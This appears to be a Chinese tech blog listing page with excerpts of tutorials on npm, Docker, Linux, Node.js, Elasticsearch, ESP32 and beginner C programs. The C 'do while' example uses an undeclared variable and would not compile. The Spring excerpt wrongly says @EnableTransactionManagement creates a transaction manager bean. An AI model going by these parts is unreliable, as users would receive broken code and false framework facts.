			<a href="/posts/7214e6464cd4e2fea80dda852f4c9aa0/" rel="bookmark">
			离线安装npm包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.先在联网机器上下载安装npm-bundle和http-server 以管理员身份运行打开cmd 然后npm install npm-bundle 或者 cnpm install npm-bundle npm install http-server或者 cnpm install http-server 2.用npm-bundle将http-server打包，打包会生成http-server-14.1.1.tgz文件 3.将http-server-14.1.1.tgz文件复制到（离线）目标服务器上 使用npm install ./http-server-14.1.1.tgz -g 安装到（离线）服务器上 4.执行http-server -p 1234命令，在端口1234上启动http-server 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9318df9a7f83a573545ab72a18ef1d9/" rel="bookmark">
			Docker笔记 容器的数据卷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好 我是积极向上的湘锅锅💪💪💪
1. 数据卷概念 思考：
Docker容器删除后，在容器中产生的数据还在吗？
答案是不在了，数据存放在容器中，如果将容器删除，数据也会被一并删除
Docker容器和外部机器可以直接交换文件吗？
答案是不行，因为外部机器与docker内部之间是不互通的，但是外部机器和宿主机是互通的
容器之间想要进行数据交互？ 可以通过数据卷的方式进行交互
数据卷：
数据卷是宿主机的一个目录或文件当容器目录和数据卷目录绑定之后，对方的修改会立即同步，跟linux的挂载很相似，就像mount了一个u盘一个数据卷可以被多个容器同时挂载一个容器也可以挂载多个数据卷
数据卷作用：
容器数据持久化外部机器和容器间通信容器之间数据交换 2. 配置数据卷 创建启动容器时，使用-v 参数 设置数据卷 docker run ... -v 宿主机目录（文件）：容器内目录（文件）... 注意事项：
目录必须是绝对路径如果目录不存在，会自动创建可以挂载多个数据卷 3.数据卷容器 多容器进行数据交换主要是俩种方式：
多个容器挂载同一个数据卷数据卷容器,将一个容器作为载体，进行间接挂载
配置数据卷容器 创建启动c3数据卷容器，使用-v参数 设置数据卷 docker run -it --name=c3 -v /volume centos:7 /bin/bash 创建c1，c2容器，使用–volumes-from 参数 设置数据卷 docker run -it --name=c1 --volumes-from c3 centos:7 /bin/bash docker run -it --name=c2 --volumes-from c3 centos:7 /bin/bash 4.数据卷小结 数据卷概念
– 宿主机的一个目录或文件
数据卷作用
– 容器数据持久化
– 客户端和容器数据交换
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9318df9a7f83a573545ab72a18ef1d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20aa1bea12b36f15eccbd5be8853fa2e/" rel="bookmark">
			系统集成项目管理工程师笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目 录 第1章 信息化知识 11.1 信息与信息化 11.1.1 信息 11.1.2 信息系统 51.1.3 信息化 71.1.4 国家信息化体系要素 81.1.5 信息技术发展及趋势 13 1.2 国家信息化战略和规划 201.2.1 国家信息化战略目标 201.2.2 信息化的指导思想和基本原则 211.2.3 我国信息化发展的主要任务和发展重点 22 1.3 电子政务 291.3.1 电子政务的概念和内容 291.3.2 我国电子政务开展的现状 301.3.3 电子政务建设的指导思想和发展方针 311.3.4 电子政务建设的发展方向和应用重点 31 1.4 企业信息化和两化深度融合 361.4.1 企业信息化概述 361.4.2 企业资源计划 421.4.3 客户关系管理 511.4.4 供应链管理 601.4.5 电子商务 69 1.5 商业智能 771.6 新一代信息技术及应用 841.6.1 大数据 841.6.2 云计算 921.6.3 互联网+ 971.6.4 智慧城市 99 第2章 信息系统集成及服务管理 1082.1 信息系统集成及服务管理体系 1082.1.1 信息系统集成及服务管理的内容 1082.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20aa1bea12b36f15eccbd5be8853fa2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a223838b3caaba262df10f81ddb630e/" rel="bookmark">
			I.MX8MM系统构建 -- 2.linux内核编译烧录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		准备源码 源码位置：/source/myir-imx-linux.tar.gz解压源码 tar zxf myir-imx-linux.tar.gz 编译 进入源码目录后，依次执行下列指令 myir@myir-server1:$ make distclean myir@myir-server1:$ make myd_imx8mm_defconfig myir@myir-server1:$ LDFLAGS="" CC="$CC" myir@myir-server1:$ make dtbs Image modules -j24 编译完成后，镜像和设备树文件路径如下： arch/arm64/boot/Image arch/arm64/boot/dts/m yir /myb*.dtb 烧录 烧录镜像到 eMMC 拷贝编译的镜像（Image）和设备树文件（*.dtb）到开发板 boot 分区mmcblk2p1 root@myd-imx8mm:~# cd /run/media/mmcblk2p1/ root@myd-imx8mm:~# cp -rf *.dtb Image ./ root@myd-imx8mm:~# sync 验证 烧录后重启开发板使用cat /proc/version指令查看linux内核版本
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c794a1d81a066d9f0bfc2c02d21df96/" rel="bookmark">
			Android Kotlin Java 自定义日历控件 CalendarView ，支持单选，多选，按星期选，跨月份日期范围选择，样式设置，设置不可选日期，设置只可选日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitHub 源码地下载 https://github.com/hdev0225/CalendarView
CalendarView 日历控件 CalendarView 使用kotlin语言开发，支持单选，多选，按星期选，跨月份日期范围选择，样式设置，设置不可选日期，设置只可选日期 设置不可选择日期，设置只可选择某些日期 运行环境 AS 版本： Android Studio Dolphin | 2021.3.1
Android Gradle Plugin Version: 7.3.0
Gradle Version: 7.5
示例 Demo
安装 1、添加JitPack仓库到根路径下的build.gradle
allprojects { repositories { // ... maven { url 'https://jitpack.io' } } } 2、添加依赖到模块中的build.gradle
dependencies { implementation 'com.github.hdev0225:CalendarView:v1.0.6' } 日历功能简介 简单应用 单选日历 SingleCalendarView 多选日历 MultiCalendarView 按星期选择日历 WeekCalendarView 日期范围选择 RangeCalendarView 设置样式 设置不可选择日期列表 设置只可选择某些日期列表 简单示例 默认情况下：开始日期为1970-1-1，结束日期为手机时间，并选中当前时间
&lt;com.hdev.calendar.view.SingleCalendarView android:id="@+id/calendar_view" android:layout_width="match_parent" android:layout_height="400dp" android:layout_margin="15dp" android:background="@drawable/bg" /&gt; 单选日历 &lt;com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c794a1d81a066d9f0bfc2c02d21df96/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e96248a2274150d2274f0ca2f0d0e7f/" rel="bookmark">
			服务端测试开发必备技能：Mock测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是mock测试
Mock 测试就是在测试活动中，对于某些不容易构造或者不容易获取的数据/场景，用一个Mock对象来创建以便测试的测试方法。
Mock测试常见场景
无法控制第三方系统接口的返回，返回的数据不满足要求
依赖的接口还未开发完成，就需要对被测系统进行测试
Mock测试的缺点
测试过程中如果大量使用Mock，mock测试的场景失去了真实性，可能会导致在后续的系统性测试时才发现bug，使得缺陷发现的较晚，可能会造成后续修复成本更大
Mock工具：Fiddler / Postman
01 实战 postman 创建一个mock server
步骤一：
在左上角有一个New，点开后会有下拉列表展示，选择里面的Mock Server
步骤二：
勾选Request-Body（请求内容）
步骤三：
填写mock测试的各个请求参数，之后点击Next下一步
步骤四：
创建mock server
填写Mock服务的名称（可用中文）
勾选Make this Mock server private，可以不勾选；如果勾选了，这个Mock服务就只能你自己私有访问，此时创建的Mock Service需要一个x-api-key，把生成的key放到header中，具体生成x-api-key后面会介绍
选择环境，如果没有合适的环境可以选择no environment
勾选 Save the mock server URL as an environment variable
步骤五：
点击here获取mock 接口密钥，登陆浏览器设置，然后点击close
黄色部分就是Mock服务器地址，这个mock server是postman在自己的服务器上为我们创建的，无论我们是否打开postman，我们都可以直接用这个地址来访问mock的API，如我们通过Jmeter也能对这个接口进行访问
如果需要对这个Mock服务创建API key，可以点击here打开一个浏览器页面，生成一个API key，（注意，这个key值只出现一次，复制好以后最好新建一个记事本粘进去），后面访问这个接口的时候，必须在请求头里带上 API key，才能访问成功，相当于一个接口鉴权的作用。
x-api-key获取地址：https://web.postman.co/settings/me/api-keys?
步骤六：
Mock服务创建成功
创建成功后回到postman主界面，在右侧collection集合出出现了一个以刚才mock server命名相同的collection，点击这个集合右上角的箭头，选择mock，出现mock server的地址。
这个{{url}}其实就是我们的Mock服务地址，鼠标放上去可以显示，如果使用postman进行测试，使用时地址栏内的{{url}}一定要带着，如果
使用其它工具如Jmeter，可以使用{{{url}}变量中具体的值，也即如上图中的https://3b84b4c3-de01-4016-83aa-60943c1984b8.mock.pstmn.io：在这个mock server地址，其后面路径名称以及层级均可自定义，但要记得设置对应的example并且保存后再运行。
步骤七：
修改Mock Server，如果需要修改Mock Server，点击进入Mock Server服务，点击右上角的Examples就可以修改了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e96248a2274150d2274f0ca2f0d0e7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33412c7144dbae2721dfe6beaf31384/" rel="bookmark">
			Linux环境部署以及项目搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、Linux环境搭建
1.使用云服务器
2.下载xshell并且远程控制服务器
二、将项目部署到linux云服务器上
1.搭建java部署环境
1.1 在linux安装jdk
1.2 将tomcat安装包上传到linux服务器上
1.2.1将tomcat安装包上传到linx服务器中
1.2.2 解压缩tomcat安装包
1.2.3 把tomcat的启动脚本加上可执行权限
1.2.4 启动tomcat
1.2.5查看8080端口号和tomcat进程是否存在
1.3 安装mariadb
1.3.1 安装
1.3.2 启动
1.3.3 测试连接
1.3.4 创建数据库
2.部署web项目到linux云服务器上（基于博客系统）
2.1 对代码进行微调
2.2 建库建表
2.3 打包部署
2.4 通过浏览器访问
一、Linux环境搭建 1.使用云服务器 使用云服务器，可以选择腾讯云、阿里云、华为云等厂商直接购买一个服务器。新用户好像有的可以试用几个月。以下就是试用阿里云的服务器：
以下选择centOS7版本就可以。然后购买成功后需要重置一下密码，避免被黑客入侵，下图中的重置实例密码。
2.下载xshell并且远程控制服务器 关于下载直接在官网进行下载，下载免费版本即可。
准备和刚刚部署的服务器进行连接。
如上图，打开xshell，点击文件 -&gt; 新建
以上新建中，名称任意取，然后主机（H）是刚刚部署的服务器的ip地址。
如下就连接成功了。
二、将项目部署到linux云服务器上 1.搭建java部署环境 1.1 在linux安装jdk 使用“包管理器”（yum）进行安装。
yum list | grep jdk //搜索出和jdk相关的软件包 yum install java-1.8.0-openjdk-devel.x86_64 1.2 将tomcat安装包上传到linux服务器上 1.2.1将tomcat安装包上传到linx服务器中 进入一个文件目录，将安装包直接手动拖到xshell命令窗口即可。
如果不能手动拖，先执行以下命令，下载lrzsz
yum install lrzsz rz ：是指将文件从windows上传linux
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b33412c7144dbae2721dfe6beaf31384/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cff78d01efd3f1b7d6f3ccb010633e53/" rel="bookmark">
			Idea 修改默认 Maven 为自己的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每次我们打开新项目时,都要去配置一遍 maven,很麻烦,其实可以去修改 idea 里面默认的 maven 配置,这样后面不管是打开新项目还是老项目,就都是用的自己的 maven 了.
1.文件-&gt;新项目设置-&gt;新项目的设置
File-&gt;Other Settings -&gt; Settings for New Project
2.然后和之前给单个项目一样设置就行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b963efa164b4a3a6aa254d2606d86d1/" rel="bookmark">
			uni.createAnimation创建动画
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniapp中创建动画可以使用css的@keyframes，或者canvas，本文是使用uni.createAnimation。
&lt;template&gt; &lt;view class=""&gt; &lt;view :animation="animationData" &gt;这是一个测试动画&lt;/view&gt; &lt;/view&gt; &lt;/template&gt; &lt;script&gt; export default{ //页面加载后立即执行 onShow: function(){ var animation = uni.createAnimation({ duration: 2000, //动画持续时间 timingFunction: 'linear', //动画运动的样式，此处是均速 }) this.animation = animation //变换背景色和透明度（从0到1） animation.backgroundColor('#ff6600').opacity(1).step() //x轴和y轴放大2倍，同时顺旋转45度 // animation.scale(2,2).rotate(45).step() //导出动画，就是让动画动起来 this.animationData = animation.export() //延时函数 // setTimeout(function() { // animation.backgroundColor('#ff6600').opacity(1).step() // // animation.translate(30).step() // this.animationData = animation.export() // }.bind(this), 1000) }, } &lt;/script&gt; 如何想要点击后触发动画，可以在script增加函数methods，将动画复制过去就能实现。
更多详情可以看uni.createAnimation(OBJECT) | uni-app官网 (dcloud.net.cn)
下面是使用@keyframes
&lt;template&gt; &lt;view class=""&gt; &lt;button @click="startAnimation"&gt;开始动画&lt;/button&gt; &lt;text :class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b963efa164b4a3a6aa254d2606d86d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bf70b4225d9c7460bf97508e4f7a5db/" rel="bookmark">
			spring中注解驱动事务框架的源码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring 中的注解驱动事务框架是基于 AOP（Aspect-Oriented Programming）实现的。它通过在方法上添加事务相关的注解，如 @Transactional，来进行事务管理。
下面是对 Spring 注解驱动事务框架源码的详细解读：
@EnableTransactionManagement 注解
：这个注解通常用于配置类上，用于开启 Spring 的事务管理功能。它会创建一个名为 transactionManager 的 PlatformTransactionManager bean，并进行必要的配置。
@Transactional 注解：
这个注解用于修饰需要进行事务管理的方法或类。它可以配置在方法级别或类级别。当配置在方法级别时，只有被注解修饰的方法会受到事务管理；当配置在类级别时，该类中所有的 public 方法都会受到事务管理。
AnnotationTransactionAspect 类：
这是 Spring 框架中负责处理 @Transactional 注解的切面类。它使用 Spring AOP 技术拦截被 @Transactional 注解修饰的方法，并在方法执行前后应用事务逻辑。
TransactionInterceptor 类：
这个类是 AnnotationTransactionAspect 类中使用的拦截器。它实现了 MethodInterceptor 接口，可以拦截目标方法的调用，并在方法执行前后应用事务逻辑。
PlatformTransactionManager 接口：
这个接口是 Spring 事务管理的核心接口，定义了事务管理器的规范。它提供了事务的起始、提交、回滚等方法。
TransactionSynchronizationManager 类：
这个类用于管理线程绑定的事务状态。它提供了静态方法来获取当前事务的状态，如判断是否存在事务、是否已经完成等。
主要用于统一管理多个事务同步对象的生命周期，并提供支持多个事务嵌套的特性。在 Spring 中，默认情况下事务管理器是会开启事务，将被管理的对象（通常是数据库连接或者 Hibernate session）加入到当前线程的事务上下文中。同时，在每个与事务相关的执行点，Spring 会检查当前线程中是否存在已经开启的事务，并将该事务上下文与当前执行点进行关联。此时，TransactionSynchronizationManager 就起到了重要的作用：它会在事务开始之前，创建一个钩子函数，用于在事务提交或回滚之后执行相应的操作。
具体来说，TransactionSynchronizationManager 的作用主要包括以下几个方面：
统一管理多个事务同步对象的生命周期，确保这些对象都能够正确的参与到当前事务中。
在事务开始之前，为当前事务打上标记，以便事务管理器在后续的执行过程中，能够正确的将该事务与执行点进行关联。
在事务提交或回滚之后，通过调用钩子函数，完成事务提交和回滚后的清理工作，例如资源释放、缓存清除等操作。
提供支持多个事务嵌套的特性，对于嵌套的事务，TransactionSynchronizationManager 会在每个嵌套的事务开始时创建一个新的事务上下文，并将该事务上下文与当前线程进行关联，使得多个嵌套的事务能够正确的协同工作。
TransactionTemplate 类：
这个类是 TransactionInterceptor 类中使用的模板类，它封装了常见的事务操作，简化了事务编程的过程。
当执行被 @Transactional 注解修饰的方法时，AnnotationTransactionAspect 拦截器会被触发。它通过 TransactionInterceptor 来应用事务逻辑，使用 PlatformTransactionManager 来管理事务，并利用 TransactionSynchronizationManager 来保持事务上下文信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bf70b4225d9c7460bf97508e4f7a5db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76ea8d5f0598401456fa22c80722f2b1/" rel="bookmark">
			C语言，输入身高（cm），体重（kg），计算身体的BMI值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt; int main() { int h = 0; int w = 0; double BMI = 0.0; scanf("%d %d", &amp;h, &amp;w); BMI = w/(h/100.0)/(h / 100.0); printf("%.3lf\n", BMI); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bd4e9db6e75005344e19a368f0b3ffa/" rel="bookmark">
			Node.js下载安装和环境变量配置（详细教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、官网地址下载安装包
二、安装程序
三、环境配置
四、测试
五、安装淘宝镜像
5.1、附加：如果有出现问题的小伙伴们可以检查一下自己的配置有没有出错
一、官网地址下载安装包 https://nodejs.org/zh-cn/download/
选择你的项目或系统对应的node.js版本，我这里使用的是当前最新版，Windows，64位。
如果想下载指定版本，点击【以往的版本】，即可选择自己想要的版本下载
二、安装程序 （1）下载完成后，双击安装包，开始安装Node.js
(2)直接点【Next】按钮，此处可根据个人需求修改安装路径，修改完毕后继续点击【Next】按钮
（3）可根据自身需求进行，此处我选择默认安装，继续点击【Next】按钮
（4）不选中，直接点击【Next】按钮
（5）点击【Install】按钮进行安装
（6）安装完毕，点击【Finish】按钮
（7）测试安装是否成功，按下【win+R】键，输入cmd，打开cmd窗口 输入：node -v // 显示node.js版本
npm -v // 显示npm版本
--成功显示版本说明安装成功
三、环境配置 （1）找到安装的目录，在安装目录下新建两个文件夹【node_global】和【node_cache】
（2）创建完毕后，使用管理员身份打开cmd命令窗口（打开方法见下方Tips），输入
①npm config set prefix “你的路径\node_global” （复制你刚刚创建的“node_global”文件夹路径）
npm config set prefix "G:\node\nodejs\node_global" ②npm config set cache “你的路径\node_cache” （复制你刚刚创建的“node_cache”文件夹路径）
npm config set cache "G:\node\nodejs\node_cache" Tips: 使用管理员身份运行cmd的方法 ：点击左下角【开始】菜单，在搜索区域输入“命令提示符”，然后点击【以管理员身份运行】
==============或单击鼠标右键选择【以管理员身份运行】==========================
（3）配置环境变量
①【此电脑】-单击右键-【属性】-【高级系统设置】-【环境变量】
② 在【系统变量】中点击【新建】
1） 变量名：NODE_PATH
变量值：C:\Program Files\nodejs\node_global\node_modules
（这个变量值是自己安装文件的位置，根据自己存放的地方修改node_global前的位置信息）
然后你就会发现【node_global】里多出了一个【node_modules】文件夹
Tips: 如果输入变量值之后没有自动创建【node_modules】文件夹，就在【node_global】下手动创建一个【node_modules】文件夹，再复制你创建的【node_modules】文件夹的路径地址到变量值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bd4e9db6e75005344e19a368f0b3ffa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d3b8e4071e195e25589adee16e3e450/" rel="bookmark">
			点击el-dialog关闭按钮无效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、:visible改成:visible.sync 2、一般情况就是dialog里面数据报错才导致关闭不了 要先解决数据报错问题。 这是同事做的判断 离了个谱做了判断赋值还在外面直接赋值 正确的放在判断里面才行解决数据报错
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5caa43ccd49f33bcd1ffa88e3cf8e616/" rel="bookmark">
			C语言，输入4个整数，输出最大值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，简单型 #include&lt;stdio.h&gt; int main() { int a, b, c, d,i; //这里的i作为一个交换数值作用 scanf("%d %d %d %d", &amp;a, &amp;b, &amp;c, &amp;d); if (a &lt; b) { i = b; b = a; a = i; } if (a &lt; c) { i = c; c = a; a = i; } if (a &lt; d) { i = d; d = a; a = i; } printf("%d\n", a); return 0; } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5caa43ccd49f33bcd1ffa88e3cf8e616/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a114c3d2c361262e8be6b6335c749692/" rel="bookmark">
			C语言，输入一串字符，统计有多少个字母
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt; int main() { char a; int num=0; while((a=getchar())&amp;&amp;a!='\n') { if((a&gt;='a'&amp;&amp;a&lt;='z')||(a&gt;='A'&amp;&amp;a&lt;='Z')) num++; } printf("%d\n",num); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d56991742ef8a4a890170767a4b43f30/" rel="bookmark">
			C语言，输入一个人的出生日期（年月日），将该出生日期的年，月，日分别输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1， #include&lt;stdio.h&gt; int main() { int a = 0; scanf("%d", &amp;a); printf("出生年份%d\n", a / 10000); printf("出生月份%d\n", (a % 10000)/100); printf("出生日期%d\n",(a % 10000)%100); return 0; } 2.
#include&lt;stdio.h&gt; int main() { int year = 0; int month = 0; int day = 0; scanf("%4d%2d%2d", &amp;year, &amp;month, &amp;day); //取输入的前四位作为year，取第五，六位作为month，后两位作为day； printf("%d\n", year); //打印year； printf("%02d\n", month); //这里02的意思是如果月份是1-9月份时，要在前面补0，加0凑齐两位，如02； printf("%02d\n", day); //意义同上； return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b99a0ff39dfad5950a75867e9d5acae8/" rel="bookmark">
			C语言用循环语句打印1-10的数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.while循环
#include&lt;stdio.h&gt; int main() { int i = 1; while (i &lt;= 10) { printf("%d\n", i); i++; } return 0; } 2.for循环
#include&lt;stdio.h&gt; int main() { int i = 1; for (i; i &lt;= 10; i++) { printf("%d\n", i); } return 0; } 3.do while循环
#include&lt;stdio.h&gt; int main() { do { printf("%d\n", i); i++; } while (i &lt;= 10); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80bb30fccb2c9ca0bac267fc7b016193/" rel="bookmark">
			c语言判断一个数是偶数还是奇数？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt; int main() { int a = 0; //定义一个变量a，并赋值为0； scanf("%d", &amp;a); //输入a的值； if (a % 2 == 0) //判断a除以2是否有余数，0为没有余数，满足条件时，输出下面的值； printf("%d是偶数",a); //满足if条件时输出； else //不满足if条件时，输出下面 printf("%d是奇数",a); //输出 return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/872ee6a2e2d6de69506d63b9cc7be522/" rel="bookmark">
			全文检索及Lucene及elasticsearch详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		全文检索
Lucene工具
elasticsearch基础
elasticsearch数据处理
elasticsearch数据查询
elasticsearch-head
elasticsearch-postman
elasticsearch-Kibana
springboot-elasticsearch
快捷使用导航
API快捷使用导航
常见ES报错情况
全文检索
一、什么是全文检索
数据的分类： 结构化数据
格式固定、长度固定、数据类型固定
例如：数据库中的数据
非结构化数据
格式不固定、长度不固定、数据类型不固定
例如：word文档、pdf文档、邮件、html、txt
数据的查询： 结构化数据的查询
sql语句。查询结构化数据的方法简单、速度快。非结构化数据的查询 目测
使用程序把文档读取到内存中，然后匹配字符串，顺序扫描
把非结构数据变成结构化数据
(举例英文文档)先根据空格进行字符串拆分，得到一个单词列表，基于单词列表创建一个索引。
然后查询索引，根据单词和文档的对应关系找到文档列表，这个过程叫做全文检索。
索引：一个为了提高查询速度，创建某种数据结构的集合。
全文检索：
先创建索引然后查询索引的过程叫做全文索引
索引一次创建可以多次使用，表现为每次查询速度很快。 二、 全文检索的应用场景
搜索引擎
百度、360搜索、谷歌、搜狗站内引擎
论坛搜索、微博、文章搜索电商搜索
淘宝搜索、京东搜索(搜索到的商品数据)
只要是有搜索的地方就可以使用全文检索技术 Lucene工具
lucene是一个基于java开发全文检索的工具包
Lucene 实现全文检索的流程
创建索引 获得文档
1. 原始文档：要基于哪些数据来进行搜索，那么这些数据就是原始文档
2. 搜索引擎：使用爬虫获取原始文档
3. 站内搜索：数据库中的数据
案例：直接使用io读取到磁盘上的文件
构建文档对象
对应每个原始文档创建一个Document对象
每个document对象中包含多个域(field)
域中保存就是原始文档数据
域的名称域的值
每个文档都有一个唯一的编号，就是文档id
分析分档
就是分词的过程
根据空格进行字符串拆分，得到一个单词列表把单词统一转换为小写去除标点符号去除停用词
停用词：无意义的词(the a)
每个关键词都封装成一个Term对象中。
Term中包含两部分内容： 关键词所在的域关键词本身
不同的域中拆分出来的相同的关键词是不同的Term 创建索引
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/872ee6a2e2d6de69506d63b9cc7be522/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bf8677775df84502c25bbeb4df5817b/" rel="bookmark">
			ESP32编译自己的micropython固件以支持OV2640、SPIRAM、bluetooth等完整功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文描述如何通过usercmodule（用户c模块）的方式，安装esp32-cam的OV2640摄像头驱动，并使固件具备支持4M SPIRAM、bluetooth等最新micropython内置模块。
注本文的主要软件版本：
Esp-idf：v4.0.2
Micropython：v1.18
一．操作系统安装 1.安装”ubuntu 20.04 LTS”，vmware或者windows的WSL均可，在ubuntu官网下载ISO，正常安装即可。
2.安装完成后安装一些依赖包
$ sudo apt-get install git wget libncurses-dev flex bison gperf python3 python3-pip python3-setuptools python3-serial python3-click python3-cryptography python3-future python3-pyparsing python3-pyelftools cmake ninja-build ccache libffi-dev libssl-dev python-is-python3 注意：
（1）cmake的版本可能不对，可以后面处理，方法见后。
（2）python-is-python3可能提示找不到，删除掉即可。
二． Esp-idf开发环境安装 1.在ubuntu命令行模式下依次执行如下指令：
cd ~ git clone https://gitee.com/EspressifSystems/esp-gitee-tools.git git clone https://gitee.com/EspressifSystems/esp-idf.git 执行结束后在~文件夹下生成esp-idf和esp-gitee-tools两个文件夹。
2.再执行如下指令:
cd esp-idf git checkout v4.0.2 cd esp-gitee-tools ./submodule-update.sh ~/esp-idf/ ./install.sh ~/esp-idf/ 注意：
1.执行最后这个命令可能会出现提示：Installing ESP-IDF tools
/usr/bin/env: ‘python’: No such file or directory。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bf8677775df84502c25bbeb4df5817b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0804f4113d9f9a2d6b899daa7ab2964/" rel="bookmark">
			SQL运行顺序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL运行顺序
(1)from (2) join (3) on (4) where (5)group by (6) avg,sum… （组函数） (7)having (8) select (9) distinct (10) order by(1)from (2) join (3) on (4) where (5)group by (6) avg,sum… （组函数） (7)having (8) select (9) distinct (10) order by@TOC
欢迎使用Markdown编辑器 你好！ 这是你第一次使用 Markdown编辑器 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。
新的改变 我们对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：
全新的界面设计 ，将会带来全新的写作体验；在创作中心设置你喜爱的代码高亮样式，Markdown 将代码片显示选择的高亮样式 进行展示；增加了 图片拖拽 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；全新的 KaTeX数学公式 语法；增加了支持甘特图的mermaid语法1 功能；增加了 多屏幕编辑 Markdown文章功能；增加了 焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置 等功能，功能按钮位于编辑区域与预览区域中间；增加了 检查列表 功能。 功能快捷键 撤销：Ctrl/Command + Z
重做：Ctrl/Command + Y
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0804f4113d9f9a2d6b899daa7ab2964/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/275d38662c8de27d229828b02d18030b/" rel="bookmark">
			VUE&#43;servlet上传多文件实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 网上有很多使用el-upload上传多个文件的文章，但是百度了一下，要么就是代码贴的不完整，要么就是完全不能使用的。找了一圈，最后竟然找不到一个可用的。所以最后只能选择自己造轮子了。
一：我的方案 1.1 现成的方案：
网上通用的方案是放弃本身的action上传，通过指定http-request方法。这样点击提交后就不会发起action请求。然后通过form表单的方式拼接参数，添加文件然后进行请求。
